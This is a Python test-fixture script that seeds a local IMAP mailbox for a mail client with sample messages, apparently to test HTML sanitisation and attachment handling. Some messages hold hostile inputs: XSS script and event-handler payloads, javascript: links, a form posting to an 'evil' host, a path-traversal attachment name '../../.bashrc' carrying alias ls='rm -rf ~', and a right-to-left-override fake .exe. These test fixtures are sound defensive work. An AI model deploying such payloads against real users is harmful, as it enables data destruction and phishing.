#!/usr/bin/env python3
"""Seed the Dovecot test mailbox over IMAP (APPEND) with sample messages:
plain text, HTML with remote images/scripts, and attachments."""
import imaplib, ssl, time, os
from email.message import EmailMessage
from email.utils import formatdate, make_msgid

ctx = ssl.create_default_context(cafile=os.environ.get("NM_TEST_CA", os.environ.get("NM_TEST_BASE", "/workspace/testmail") + "/certs/ca.pem"))
M = imaplib.IMAP4_SSL("127.0.0.1", 10993, ssl_context=ctx)
M.login("kaan@localhost", "testpass")

def mk(subject, frm, text=None, html=None, attach=None, days_ago=0):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = frm, "Kaan Durmus <kaan@localhost>", subject
    m["Date"] = formatdate(time.time() - days_ago * 86400, localtime=True)
    m["Message-ID"] = make_msgid(domain="example.test")
    m.set_content(text or "(no text part)")
    if html:
        m.add_alternative(html, subtype="html")
    for name, data, mt in attach or []:
        maintype, sub = mt.split("/")
        m.add_attachment(data, maintype=maintype, subtype=sub, filename=name)
    return m

def pdf(text):
    """Minimal valid one-page PDF with a line of text (opens in any viewer)."""
    objs = [b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            None,
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    stream = f"BT /F1 28 Tf 72 760 Td ({text}) Tj ET".encode()
    objs[3] = b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream"
    out = b"%PDF-1.4\n"; offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out)); out += b"%d 0 obj\n" % i + o + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offs)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
    return out

import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from make_images import png, logo, chart
IMG = "http://127.0.0.1:10880"

LINKEDIN_HTML = f"""<html><head><style>
  body {{ background:#f3f2ef; margin:0; font-family:-apple-system,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; }}
  .wrap {{ max-width:600px; margin:0 auto; background:#ffffff; border-radius:8px; overflow:hidden; }}
  .top {{ background:#0a66c2; color:#ffffff; padding:14px 24px; font-weight:600; font-size:18px; }}
  .job {{ border-bottom:1px solid #e0dfdc; padding:16px 24px; }}
  .job a.title {{ color:#0a66c2; font-size:16px; font-weight:600; text-decoration:none; }}
  .meta {{ color:#666666; font-size:13px; }}
  .btn {{ display:inline-block; background:#0a66c2; color:#ffffff !important; padding:8px 18px; border-radius:16px; text-decoration:none; font-weight:600; }}
  .foot {{ color:#666666; font-size:11px; padding:16px 24px; }}
</style></head><body>
<div class="wrap">
  <div class="top"><img src="{IMG}/logo.png" width="24" height="24" alt="" style="vertical-align:middle;border-radius:4px"> Jobs you may be interested in</div>
  <div class="job">
    <a class="title" href="https://www.linkedin.com/comm/jobs/view/4012345678/?trackingId=Zm9vYmFy%3D%3D&amp;refId=ZXhhbXBsZQ%3D%3D&amp;lipi=urn%3Ali%3Apage%3Aemail_email_job_alert_digest_01&amp;midToken=AQHq2xT&amp;midSig=2Xs_ab&amp;trk=eml-email_job_alert_digest_01-job_card-0-view_job&amp;trkEmail=eml-email_job_alert_digest_01-job_card-0-view_job-null-1a2b3c&amp;eid=1a2b3c-lzq&amp;otpToken=MTEwNzE4&amp;currentJobId=4012345678">Senior Rust Engineer</a>
    <div class="meta">Open Source Mail Co. · Berlin (Hybrid) · 3 connections work here</div>
  </div>
  <div class="job">
    <a class="title" href="https://www.linkedin.com/comm/jobs/view/4019876543/?trackingId=YmF6&amp;lipi=urn%3Ali%3Apage%3Aemail&amp;trk=eml-email_job_alert_digest_01-job_card-1-view_job&amp;currentJobId=4019876543">GNOME Desktop Developer</a>
    <div class="meta">Free Desktop GmbH · Remote · Actively recruiting</div>
  </div>
  <div class="job"><a class="btn" href="https://www.linkedin.com/comm/jobs/search/?keywords=rust&amp;trk=eml-email_job_alert_digest_01-see_all_jobs&amp;lipi=urn%3Ali%3Apage%3Aemail&amp;midToken=AQHq2xT">See all jobs</a>
  &nbsp; <a href="https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fblog%2Eexample%2Eorg%2Frust-gnome%3Futm_source%3Dlinkedin%26utm_medium%3Demail&amp;urlhash=Ab1x&amp;trk=eml-article">Read: Rust on the GNOME desktop</a></div>
  <div class="foot">This email was intended for Kaan Durmus (Software Engineer). <a href="https://www.linkedin.com/comm/psettings/email-unsubscribe?lipi=urn%3Ali%3Apage%3Aemail&amp;midToken=AQHq2xT&amp;trk=eml-unsubscribe">Unsubscribe</a> ·
  <a href="mailto:jobs-listings@example.test?subject=Question%20about%20Senior%20Rust%20Engineer">Contact the recruiter</a><br>
  © 2026 Example Jobs Network (test fixture, not affiliated with LinkedIn).</div>
</div></body></html>"""

def newsletter():
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = "Neutron Weekly <weekly@example.test>", "Kaan Durmus <kaan@localhost>", "Neutron Weekly: styled HTML, inline and remote images"
    m["Date"] = formatdate(time.time() - 3600, localtime=True)
    m["Message-ID"] = make_msgid(domain="example.test")
    m.set_content("Neutron Weekly (HTML version recommended).")
    html = f"""<html><head><style>
      .hero {{ background:linear-gradient(90deg,#6d4aff,#a995ff); color:#fff; padding:24px; border-radius:12px; }}
      h2 {{ font-family:Georgia,serif; color:#2d1b69; }}
      .pill {{ background:#ebe5ff; color:#6d4aff; border-radius:999px; padding:2px 10px; font-size:12px; }}
      td.cell {{ border:1px solid #e4e1ee; padding:10px; }}
    </style></head><body>
    <div class="hero"><img src="cid:logo@neutron" width="48" height="48" alt="logo" style="float:right;border-radius:10px">
      <h1 style="margin:0;font-size:26px">Neutron Weekly</h1><p style="margin:6px 0 0">Styled HTML with CSS, an inline (cid:) image and remote images.</p></div>
    <h2>This week <span class="pill">new</span></h2>
    <table width="100%" cellspacing="0" style="border-collapse:collapse"><tr>
      <td class="cell"><b>Inline chart</b><br><img src="cid:chart@neutron" alt="inline chart"></td>
      <td class="cell"><b>Remote banner</b><br><img src="{IMG}/banner.png" alt="remote banner" width="260"></td></tr></table>
    <p style="color:#555">Remote tracker: <img src="{IMG}/fake.png" width="1" height="1" alt=""> (not a real image; must never load)</p>
    </body></html>"""
    m.add_alternative(html, subtype="html")
    html_part = m.get_payload()[1]
    html_part.add_related(png(64, 64, logo), "image", "png", cid="<logo@neutron>")
    html_part.add_related(png(260, 160, chart), "image", "png", cid="<chart@neutron>")
    return m

def team_thread():
    m = mk("Release planning for v0.2", "Elena Martinez <elena@example.test>",
           text="Hi all,\n\nCan everyone confirm their items for v0.2 by Friday?\n\nThanks,\nElena", days_ago=0)
    del m["To"]
    m["To"] = "Kaan Durmus <kaan@localhost>, Jasper Collins <jasper@example.test>"
    m["Cc"] = "Sofia Patel <sofia@example.test>"
    m["References"] = "<kickoff-001@example.test>"
    return m

msgs = [
    mk("Welcome to Neutron Mail", "Neutron Team <team@example.test>",
       text="Hello Kaan,\n\nThis is a plain-text welcome message.\n\nCheers", days_ago=3),
    mk("Quarterly report (HTML + tracking pixel)", "Finance <finance@example.test>",
       text="Your quarterly report is ready.",
       html="""<html><body><h1 style="color:#6d4aff">Quarterly report</h1>
<p>Revenue is <b>up 12%</b>. See <a href="https://example.test/report">the report</a>.</p>
<img src="https://tracker.example.test/pixel.gif?u=kaan" width="1" height="1">
<script>alert('xss')</script>
<p onclick="alert(1)">Click handler should be stripped.</p>
<iframe src="https://evil.example.test"></iframe>
</body></html>""", days_ago=2),
    mk("Invoice #4711 attached", "Billing <billing@example.test>",
       text="Please find the invoice attached.",
       attach=[("invoice-4711.pdf", pdf("Invoice 4711 - EUR 1,234.00"), "application/pdf"),
               ("notes.txt", b"Payment due in 30 days.\n", "text/plain")], days_ago=1),
    mk("Files from IT (attachment safety test)", "IT Helpdesk <it@example.test>",
       text="Please run the setup script. (Test fixture for dangerous attachments.)",
       attach=[("setup.sh", b"#!/bin/sh\necho pwned > /tmp/neutron-pwned\n", "application/x-sh"),
               ("../../.bashrc", b"alias ls='rm -rf ~'\n", "text/plain"),
               ("report\u202Etxt.exe", b"MZ\x90\x00fake", "application/octet-stream")], days_ago=0),
    mk("Jobs you may be interested in: Senior Rust Engineer", "Jobs Network <jobs-noreply@example.test>",
       text="Senior Rust Engineer - https://www.linkedin.com/comm/jobs/view/4012345678/", html=LINKEDIN_HTML, days_ago=0),
    newsletter(),
    team_thread(),
    mk("Lunch on Friday?", "Ayse Yilmaz <ayse@example.test>",
       text="Hey, are you up for lunch on Friday? The new ramen place.", days_ago=0),
    mk("Phishing test", "Security <security@example.test>",
       text="test",
       html='<p>Login <a href="javascript:alert(1)">here</a> <form action="https://evil.test"><input name=p></form>'
            '<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline-data">'
            '<style>body{background:url(https://evil.test/bg.png)}</style></p>', days_ago=0),
]
for m in msgs:
    M.append("INBOX", "", imaplib.Time2Internaldate(time.time()), m.as_bytes())
M.append("Sent", "\\Seen", imaplib.Time2Internaldate(time.time()),
         mk("Re: Project kickoff", "Kaan Durmus <kaan@localhost>", text="Sounds good, see you then.").as_bytes())
print("seeded", len(msgs) + 1, "messages")
M.logout()
